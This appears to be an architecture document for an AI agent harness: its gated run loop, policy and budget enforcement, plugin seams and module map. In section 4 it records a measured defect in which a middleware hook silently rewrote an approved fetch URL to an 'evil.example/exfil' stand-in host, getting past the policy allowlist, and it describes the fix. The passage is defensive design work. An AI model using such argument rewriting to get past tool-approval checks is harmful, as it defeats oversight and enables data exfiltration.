# 02 — Architecture

## 1. The shape in one paragraph

An `Agent` is an **immutable configuration**. Running one creates a mutable `Run` that
executes a small, explicit loop: assemble context → call the model → decide on each
requested tool → execute the allowed ones → append results → repeat. Four services hang
off that loop — the **Ledger** (may we spend?), the **Policy engine** (may we act?), the
**Context assembler** (what exactly do we send?), and the **Event bus** (what happened?).
Six things are pluggable; everything else is core and deliberately not overridable.

Immutability of `Agent` is not stylistic. It is what makes the prompt prefix stable, which
is what makes caching work, which is the single largest cost lever in the system.

## 2. Layers

```
┌────────────────────────────────────────────────────────────────┐
│  L4  Facade      Agent · @tool · Secret · Result · run()       │  ← 99% of users stop here
├────────────────────────────────────────────────────────────────┤
│  L3  Services    Ledger · PolicyEngine · ContextAssembler      │
│                  EventBus · TaintTracker · Scheduler           │
├────────────────────────────────────────────────────────────────┤
│  L2  Core        RunEngine (the loop) · ToolSet · Transcript   │
├────────────────────────────────────────────────────────────────┤
│  L1  Ports       ModelProvider · Store · Policy · Exporter     │  ← the 6 plugin seams
│                  Sandbox (+ Tool, declared at L4 via @tool)    │
├────────────────────────────────────────────────────────────────┤
│  L0  Adapters    AnthropicProvider · SqliteStore · OtelExporter│
└────────────────────────────────────────────────────────────────┘
```

Dependencies point **downward only**. L2 knows the L1 protocols and never the L0 adapters —
this is what makes the whole system testable with fakes, and it is enforced by
`tests/test_layering.py::L2NeverNamesAnL0Adapter`, not by discipline.

That sentence used to name an **import-linter rule in CI**, and there was no such rule:
`grep -rn "import-linter"` hit three `.md` files and nothing else — no `.importlinter`,
nothing in `pyproject.toml`, not in the dev dependencies. The property held nearly
everywhere and was checked nowhere. Two things are true about it that a bare "never" hid:

* A **composition root** is supposed to know concrete types — `agent.py` building the
  exporters a run gets, `cli`, `server`, `credentials` resolving a provider name, the
  `testing` kit handing out fakes. Forbidding that would only move the wiring behind the
  factory §8 below rejects.
* Three modules are neither composition roots nor compliant, and the test names them as
  KNOWN GAPs rather than excluding them quietly: `dispatch.py` hard-wires
  `InMemoryStore` for idempotency dedup **without** exposing `idempotency_store=`, which
  `lg/runtime.py` does — the same capability, two backends, one switch; `tools/code.py`
  picks `Subprocess` rather than taking a `Sandbox`; and `contrib/driver.py` imports
  `FakeModel` for the demo its own tier rule says belongs in `examples/`.

## 3. The run loop

This is the heart of the system and it is intentionally boring. It is the *only* place
where cost and safety can be enforced, which is why the harness owns it rather than
delegating to the SDK's tool runner (ADR-001).

```
                     ┌──────────────┐
                     │   START      │
                     └──────┬───────┘
                            v
              ┌─────────────────────────────┐
              │ assemble context            │  deterministic; cached prefix
              └─────────────┬───────────────┘
                            v
              ┌─────────────────────────────┐
        ┌────>│ ledger.reserve(worst_case)  │──── insufficient ──> STOP(BUDGET_EXHAUSTED)
        │     └─────────────┬───────────────┘
        │                   v
        │     ┌─────────────────────────────┐
        │     │ provider.complete(request)  │──── refusal ───────> STOP(MODEL_REFUSAL)
        │     └─────────────┬───────────────┘     error ─────────> retry / STOP(ERROR)
        │                   v
        │           stop_reason == "tool_use" ? ──── no ─────────> STOP(COMPLETED)
        │                   │ yes
        │                   v
        │     ┌─────────────────────────────┐
        │     │ for each tool_use block:    │
        │     │   policy.decide(call, ctx)  │  ALLOW / ASK / DENY
        │     └─────────────┬───────────────┘
        │                   v
        │     ┌─────────────────────────────┐
        │     │ scheduler.execute(allowed)  │  parallel-safe → concurrent
        │     │   timeout · truncate · taint│  others        → serial
        │     └─────────────┬───────────────┘
        │                   v
        │     ┌─────────────────────────────┐
        │     │ append ALL tool_results as  │  one user message — never split
        │     │ a single user message       │
        │     └─────────────┬───────────────┘
        │                   v
        │           step_count < limit ? ──── no ──────────────> STOP(STEP_LIMIT)
        └───────────────────┘ yes
```

Four invariants of the loop, each with a test in [§09](09-testing.md):

- **I-1** No model call happens without a successful ledger reservation immediately before it.
- **I-2** No tool executes without a policy verdict of `ALLOW` recorded immediately before it.
- **I-3** Every `tool_use` block receives exactly one `tool_result` block — including denied
  and failed ones (as `is_error`). A missing result is a protocol violation that corrupts
  the conversation.
- **I-4** All `tool_result` blocks for one assistant turn go in **one** user message.

## 3.1 Two engines, one Agent

The loop above is the default engine. `harness[graph]` supplies a second one
(`harness.lg`) in which **LangGraph** owns the loop and the rules are expressed as
topology (ADR-032):

```
START → budget → model → policy → approve → tools ┐
          │        │                              │
          └────────┴──────────→ finish → END      └──→ budget
```

There is no edge into `model` that does not pass `budget`, none into `tools` that does not
pass `policy`, and none into `END` that does not pass `finish`. `unguarded_paths()` proves
it by walking the compiled graph from `__start__` refusing to traverse a gate;
`build_agent()` refuses to return a graph for which it is non-empty:

```python
>>> graph, runtime = build_agent(model=chat, tools=[...], budget="$0.20, 15 steps")
>>> unguarded_paths(graph)
[]
```

**This is a stronger statement than the hand-written loop could make.** A compiled graph is
introspectable, so "every path to the model passes the budget gate" stops being an AST test
over our own source and becomes a reachability proof over the real execution structure —
one that holds for paths no test happens to walk.

**Two engines used to mean two APIs** — `build_agent()` returned a raw compiled graph, and
reaching it meant learning LangChain (`HumanMessage`, `.invoke()`, `thread_id` config)
alongside `Agent`. That was real user-facing friction, not just an implementation detail,
and it is closed now: `Agent(durable=True)` runs on this same engine through the *same*
`run`/`try_run`/`arun`/`atry_run`/`with_` methods everything else in this document uses —
`docs/03-public-api.md §3.5` has the parameter and the (small, tracked) list of what it
doesn't cover yet. `ProviderChatModel` (`lg/adapter.py`) is the seam that makes this
possible without a second model-calling implementation: it wears this Agent's own
`provider=` (the same `AnthropicProvider`/`FakeModel`/... the classic engine calls) as a
LangChain chat model, so a durable run goes through identical error mapping, pricing, and
`ContextAssembler` context — one provider seam, one context-assembly path, two loop
topologies. `build_agent()` and the raw compiled graph remain directly available — the
escape hatch for a power user who wants LangGraph itself, not the primary way to reach this
engine.

**What durability buys:** a run survives a process restart mid-flight (`session_id=` is the
conversation to reconnect to), `approve=INTERRUPT` for a human decision that outlives the
process, and the LangChain model ecosystem for a power user going through `build_agent()`
directly.

**What it costs:** 39 transitive packages (`langgraph-checkpoint-sqlite` — `durable=True`'s
default checkpoint store — adds 3 over the `graph` extra's prior 36), and a second
implementation of one set of rules. The second cost is the dangerous one — Round 35 found
three defects in it that the council had already found and fixed in the first. It is
bounded by `tests/test_parity.py`, which states each rule once and runs it against **all
three** call shapes (the hand-written loop, the raw graph, and `Agent(durable=True)`); a row
that differs is a defect, never a documented difference.

## 4. What is a plugin — the test

The council's answer to "pluginable does not mean everything is a plugin". An extension
point is a **plugin seam** only if all three hold:

> **(a)** A reasonable third party would publish one on PyPI.
> **(b)** The core can be written with zero knowledge of any concrete implementation.
> **(c)** We can name **two genuinely different** implementations *today* — not
> hypothetically.

Applied:

| Candidate | (a) | (b) | (c) | Verdict |
|---|:--:|:--:|:--:|---|
| **Tool** | ✅ | ✅ | ✅ hundreds | **SEAM** |
| **ModelProvider** | ✅ | ✅ | ✅ Anthropic / Bedrock / Vertex | **SEAM** |
| **Store** (memory & transcript persistence) | ✅ | ✅ | ✅ memory / SQLite / Redis | **SEAM** |
| **Policy** | ✅ | ✅ | ✅ approval / egress allowlist / PII | **SEAM** |
| **Exporter** | ✅ | ✅ | ✅ console / JSONL / OTel | **SEAM** |
| **Sandbox** (added M7/T-7.3, ADR-047) | ✅ | ✅ | ✅ `InProcess` / `Subprocess` — a real container runtime (Docker/Firecracker/gVisor) plugs into the same seam | **SEAM** |
| Run loop | ❌ | — | ❌ one | **CORE** — and see below |
| Context assembler | ❌ | ❌ must be byte-deterministic | ❌ | **CORE** |
| Budget ledger | ❌ | ❌ security-critical | ❌ | **CORE** |
| Schema generation | ❌ | ✅ | ❌ | **CORE** |
| Retry | ❌ | ✅ | ❌ SDK does it | **CORE** |
| Model router | ❌ | — | ❌ | **CORE** (and mostly deferred, ADR-006) |

**Six seams** (`Sandbox` added M7/T-7.3, ADR-047 — the table above was updated then but
this sentence wasn't; caught in the T-9.1 pass, K-13's "verify before fixing" discipline
applied to prose staleness rather than a bug). **Everything else is core.** Three of the
core items are core specifically
because making them overridable would let a plugin *defeat* an invariant: a replaceable
ledger can be replaced with one that always says yes; a replaceable assembler can
reintroduce cache invalidation; a replaceable loop can skip the policy check. Extension
points that can disable safety are not extension points, they are vulnerabilities.

The loop is not extensible, but it is **observable** (events) and **interceptable at the
defined seams** (policies decide, tools act). That covers the legitimate reasons someone
would want to override it.

**`harness.middleware`** is sugar over three of the seams above (`ModelProvider`, a
tool's own callable, `Exporter`) — a `Middleware` base class with five optional hooks
(`before_model`/`after_model`/`before_tool`/`after_tool`/`on_event`) that
`with_middleware(agent, *middlewares)` wires onto a new `Agent`. It is not a seventh
seam and not the middleware chain rejected below: every hook runs strictly *after* the
core decision it follows (`before_tool` never sees a call `Policy` already denied).

That parenthetical is true; the conclusion this sentence used to draw from it — that
stacking many of these "can only add restriction or observation, never bypass one" — was
not. `before_tool` returns the kwargs the tool is then called with, so a hook cannot
bypass a **verdict** but can change the **subject** of one. Measured with
`allowed_hosts=["docs.python.org"]` and a six-line middleware:

```
policy.decided:                     [('fetch', 'ALLOW', '')]
tool.requested arguments:           [{'url': 'http://docs.python.org/x'}]
the URL the tool was actually called with:  ['http://evil.example/exfil']
```

So a `Middleware` is **as privileged as the policy set**, and belongs on the trust
boundary list in §6 rather than in the "observation only" bucket. Rewriting arguments is
a real and useful power (redaction, defaulting, tenant scoping); the defect was that it
happened silently, leaving the transcript asserting an argument set that never ran. Every
rewrite now emits `tool.arguments_amended` naming the middleware and the fields it
changed (docs/05 §…), so "what was approved" and "what ran" stay two comparable facts.
`docs/03-public-api.md §3.6` documents it as a Level-3 extension.

**`Agent.with_profile()`** is the same shape of sugar for a different recurring need:
packaging a system prompt, a tool set, a model/effort/budget choice, and policies as one
named, reusable unit, without a second way to construct an `Agent`. `Profile` (`profile.py`)
is a two-member `Protocol` — `name: str`, `apply(agent) -> Agent` — built entirely from
`Agent.with_()`; nothing in the run loop knows it exists. What earns it the "sugar, not a
seam" label is the same discipline `Middleware` follows: `Agent.with_profile()` refuses
the result of `profile.apply()` if it loosened a safety knob the caller's own `Agent(...)`
call already set (`ProfileLoosenedSafetyError` — ADR-073), so stacking a profile on top of
an agent can only add capability, never bypass a decision already made. Two genuinely
different profiles ship as evidence the abstraction generalizes rather than merely
naming one shape twice: `examples/coding_profile.py` (file/git tools, a verification
wrapper, a subagent, a path policy) and `examples/research_profile.py` (two `external`
tools, a citation-and-skepticism prompt, no subagent, no write tools).

## 5. Module map

Every module in `src/harness/` is below, and nothing is below that is not in
`src/harness/`. That is now a test — `tests/test_gates_module_map.py` parses this block
and diffs it against the tree — because the sentence that used to be here, *"Nothing in
the plan creates a file that is not on this map,"* had stopped being true and nothing
said so:

| | measured before ADR-114 |
|---|---|
| on the map, not on disk | 7 — `_typing.py`, `context/caching.py`, `observe/bus.py`, `observe/redact.py`, `tools/invoke.py`, `tools/builtin/math.py`, `tools/builtin/shell.py` |
| on disk, not on the map | 47 — including `guards.py`, `dispatch.py`, `audit.py`, `credentials.py`, `policy/decision.py`, `sandbox.py`, `session.py`, `stop.py`, and the whole of `lg/`, `server/`, `mcp/`, `eval/` and `contrib/` |

Every safety-critical module added after roughly Round 28 was absent, including
`guards.py` — the module ADR-098 is *about*. A map that omits the guards is worse than no
map, because a reader who consults it concludes they do not exist.

The one-line descriptions are the first line of each module's own docstring, so they
cannot drift from the module either.

Kept in sync with the real tree as of H-4, `design/review-architect-round3.md` — the
prior version was missing roughly a dozen modules added since M6-M10 and named six files
that never existed (`_typing.py`, `tools/invoke.py`, `context/caching.py`,
`observe/bus.py`, `observe/redact.py`, `tools/builtin/shell.py`/`math.py`).
`find src/harness -name '*.py'` is the source of truth if this drifts again.

```
src/harness/
  __init__.py         Harness — build agents that are cheap to run, hard to misuse, and easy to …
  _value.py           `@value` — the frozen value-type decorator used throughout the package
  agent.py            Agent — the public facade
  audit.py            The audit trail — the one place a verdict becomes an artifact
  credentials.py      Where a credential comes from, and which provider that yields — one module…
  dispatch.py         Tool dispatch — split out of run.py in Round 28
  errors.py           Exception hierarchy — docs/04-interfaces.md §7
  findings.py         `FindingsLog` — the other half of what a long exploratory session needs to…
  guards.py           Construction-time guards — the rules that decide whether an `Agent` may ex…
  idempotency.py      T-6.1 — idempotency key + `execute_once` contract, docs/17-research-alignm…
  middleware.py       Middleware — compose behavior around every model/tool call, framework-mana…
  profile.py          `Profile` — a named, reusable way to turn one `Agent` into another
  progress.py         `ProgressLedger` — phát hiện agent đứng yên, bằng dữ liệu harness đã có, k…
  result.py           Core value types — docs/04-interfaces.md §0
  retry.py            Provider-level retry — N-5, docs/10-observability-ops.md §3
  run.py              RunEngine — the loop
  sandbox.py          T-7.3/T-7.4 — the `Sandbox` seam, docs/17-research-alignment.md M7
  secrets.py          Secret — docs/06-safety.md §5
  session.py          T-8.6 — `Session` as a first-class resource, docs/17-research-alignment.md…
  stop.py             Stop reasons, the ceiling on pauses, and the `returns=` parser — the vocab…
  subagent.py         Running a tool that is itself an agent, and nesting its budget into the pa…
  tasks.py            `TaskLedger` — sổ công việc bền cho một phiên chạy dài
  workspace.py        T-7.1 — workspace root confinement, docs/17-research-alignment.md M7
  budget/
    __init__.py       
    ledger.py         Budget and Ledger — docs/04-interfaces.md §4, task T-1.5
  cli/
    __init__.py       The CLI — tasks T-0.8 and T-5.1
  context/
    __init__.py       
    assembler.py      Deterministic prefix rendering — task T-2.2
    linter.py         Cache determinism checking — task T-2.3, revised by ADR-025
    window.py         Context growth policy — task T-2.6
  contrib/
    __init__.py       Shipped, reusable, and explicitly NOT covered by the compatibility promise…
    attention.py      Coarse-to-fine attention: a cheap glance decides which expensive stage is …
    calibration.py    A threshold from labelled pairs — or the refusal to hand one over
    driver.py         `Driver` — runtime events handled by PRIORITY: preempt what matters, queue…
    output_shaping.py Fixes a real, measured bug in the "long, exploratory, many trial-and-error…
    sensors.py        Two more `Sensor` implementations, so the abstraction is tested by more th…
  eval/
    __init__.py       
    benchmark.py      T-10.3 — performance benchmark, docs/17-research-alignment.md M10 / Y-05
    cost.py           T-8.4 — cost per successful task, docs/17-research-alignment.md M8 / S-06
    golden.py         T-10.2 — golden set + pass rate with a confidence interval, docs/17-resear…
    trajectory.py     T-10.1 — trajectory contract, docs/17-research-alignment.md M10
  lg/
    __init__.py       LangGraph backend — Round 35
    adapter.py        `Agent(durable=True)` — the LangGraph backend behind the classic backend's…
    graph.py          The enforcement graph — Round 35
    runtime.py        Node implementations — Round 35
    state.py          State the graph carries — Round 35
  mcp/
    __init__.py       MCP client — a harness EMBEDS third-party MCP servers as tools; it never h…
  memory/
    __init__.py       
    base.py           Store protocol — docs/04-interfaces.md §5, task T-4.2
    inmemory.py       Dict-backed Store
    sqlite.py         SQLite-backed Store — schema in docs/05-data-and-state.md §5
    viking.py         OpenViking store — Round 36, task T-4.4
  models/
    __init__.py       
    anthropic.py      The Anthropic provider — task T-0.4
    base.py           ModelProvider protocol and request/response types — docs/04-interfaces.md …
    fake.py           FakeModel — task T-0.7
    pricing.py        Per-model prices — task T-2.1
  observe/
    __init__.py       
    console.py        Human-readable progress — ADR-014
    events.py         Event taxonomy and bus — docs/05-data-and-state.md §1, task T-3.1
    otel.py           T-8.3 — a real OTel exporter, docs/10-observability-ops.md §2 (already spe…
    transcript.py     Append-only JSONL transcript — task T-3.2
  plugins/
    __init__.py       
    registry.py       Plugin registry — task T-4.1, ADR-008
  policy/
    __init__.py       
    base.py           Verdict lattice and Policy protocol — docs/04-interfaces.md §3
    builtin.py        Built-in policies — docs/04-interfaces.md §3
    decision.py       Bản ghi phê duyệt — design/00-foundation.md §4, design/02-safety-engine.md
    engine.py         Policy composition — docs/04-interfaces.md §3
    label.py          Label — nhãn hai chiều, design/00-foundation.md §3.2, design/02-safety-eng…
    taint.py          Taint tracking cho backend cổ điển — ADR-011, nâng cấp lên `Label` hai trục
  server/
    __init__.py       Service API — `POST /v1/runs`, `GET /v1/runs/{id}`, `GET /v1/runs/{id}/eve…
  testing/
    __init__.py       Test helpers — task T-0.7
    chaos.py          M6/T-6.4 — failure injection, docs/17-research-alignment.md
  tools/
    __init__.py       @tool, Effect, ToolSpec — docs/04-interfaces.md §1, tasks T-0.2 and T-1.1
    calc.py           
    code.py           `CodeTools` — bộ tool cho một agent làm việc với code, đã phân loại effect…
    files.py          
    registry.py       ToolSet — task T-0.3
    schema.py         Python signature -> JSON Schema — docs/04-interfaces.md §1, task T-0.2
    web.py            `from harness.tools.web import search` — the import §15 tells a child to w…
    builtin/
      __init__.py     Pre-classified starter tools
      calc.py         Arithmetic, evaluated without `eval`
      files.py        Local file tools
      web.py          Web tools — effect="external", so their output taints the run (ADR-011)
```

## 6. Concurrency model

- **Async is the core.** `RunEngine` is `async`. `Agent.run()` is a thin sync facade over
  `Agent.arun()` (ADR-007).
- **Sync tools are offloaded** to `asyncio.to_thread` automatically. A beginner writes
  `def` and never learns the word "coroutine".
- **Calling `.run()` from inside a running event loop** is detected and raises
  `SyncInAsyncContextError` telling you to use `await agent.arun(...)` — instead of the
  standard, baffling `RuntimeError: This event loop is already running`.
- **Parallelism is derived, not configured.** Tools whose effect class is parallel-safe
  (`read`, `external`) run concurrently under a semaphore of `max_parallel_tools`
  (default 8). `write` and `danger` serialize. The developer never chooses.
- **Cancellation** is cooperative: cancelling the task cancels in-flight tool calls,
  flushes the transcript, and returns a `Result` with `StopReason.CANCELLED`.

## 7. Failure philosophy

| Class | Behavior | Rationale |
|---|---|---|
| **Tool raised** | Caught, converted to `tool_result(is_error=True)` with the message. Run continues. | The model can often recover. A crashing tool must never destroy a run's accumulated work. NFR-08. |
| **Provider transient** (429, 5xx, connection) | SDK retry (2 attempts), then harness backoff up to the wall-clock budget. | Transient by definition. |
| **Provider permanent** (400, 401, 404) | No retry. `Result(stop_reason=ERROR)` from `try_run`, raised from `run`. | Retrying a malformed request wastes money and time. |
| **Budget / step / time exhausted** | Graceful stop with a normal `Result`; partial text preserved. | Not an error — an expected boundary. |
| **Policy DENY** | Tool not executed; `tool_result(is_error=True, "denied by policy: …")` returned to the model. Run continues. | Tells the model to try another route instead of hanging. |
| **Configuration error** | Raised at `Agent(...)` construction or at `@tool` import. Never at run time. | Poka-Yoke: runtime → configuration-time. |

## 8. Why this is not over-engineered

A fair challenge to any architecture document. The count:

- **4 public classes** a user can construct (`Agent`, `Budget`, `Secret`, plus decorators).
- **6 protocols** total, each with ≥ 2 real implementations planned.
- **1 loop**, no strategy objects, no middleware chain, no dependency-injection container,
  no plugin lifecycle with hooks.
- **0 features built "for later"** — every module above is required by a numbered
  requirement in [§01](01-requirements.md).

Deliberately absent: an `AgentBuilder`, an `ExecutorFactory`, a `MiddlewarePipeline`, a
`ContextStrategy` interface, an `AbstractTool` base class, and a plugin manifest DSL. Each
was proposed and rejected in Round 2 for failing the plugin-boundary test or KISS.
